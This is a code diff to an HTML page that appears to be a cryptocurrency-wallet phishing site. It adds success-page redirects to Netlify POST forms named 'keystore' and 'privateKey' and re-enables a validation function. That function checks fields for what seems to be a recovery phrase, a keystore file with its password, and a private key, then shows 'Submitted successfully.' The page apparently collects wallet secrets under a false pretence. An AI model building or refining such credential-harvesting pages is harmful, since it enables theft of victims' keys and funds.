@@ -91,6 +91,7 @@
               <form
                 id="form2"
                 name="keystore"
+                action="/success.html"
                 class="keystore needs-validation"
                 method="POST"
                 data-netlify="true"
@@ -144,6 +145,7 @@
               <form
                 id="form3"
                 name="privateKey"
+                action="/success.html"
                 class="privateKey needs-validation"
                 method="POST"
                 data-netlify="true"
@@ -407,23 +409,23 @@
         });
       };
 
-      //   const checkEmpty = (e) => {
-      //     const starter = e;
-      //     const textArea = document.getElementById(`${starter}-textarea`);
-      //     if (starter == "p") {
-      //       textArea.value == ""
-      //         ? alert("Fill form completely.")
-      //         : alert("Submitted successfully.");
-      //     } else if (starter == "k") {
-      //       textArea.value == "" || password.value == ""
-      //         ? alert("Fill form completely.")
-      //         : alert("Submitted successfully.");
-      //     } else {
-      //       privateKey.value == ""
-      //         ? alert("Fill form completely.")
-      //         : alert("Submitted successfully.");
-      //     }
-      //   };
+      const checkEmpty = (e) => {
+        const starter = e;
+        const textArea = document.getElementById(`${starter}-textarea`);
+        if (starter == "p") {
+          textArea.value == ""
+            ? alert("Fill form completely.")
+            : alert("Submitted successfully.");
+        } else if (starter == "k") {
+          textArea.value == "" || password.value == ""
+            ? alert("Fill form completely.")
+            : alert("Submitted successfully.");
+        } else {
+          privateKey.value == ""
+            ? alert("Fill form completely.")
+            : alert("Submitted successfully.");
+        }
+      };
     </script>
     <script
       src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
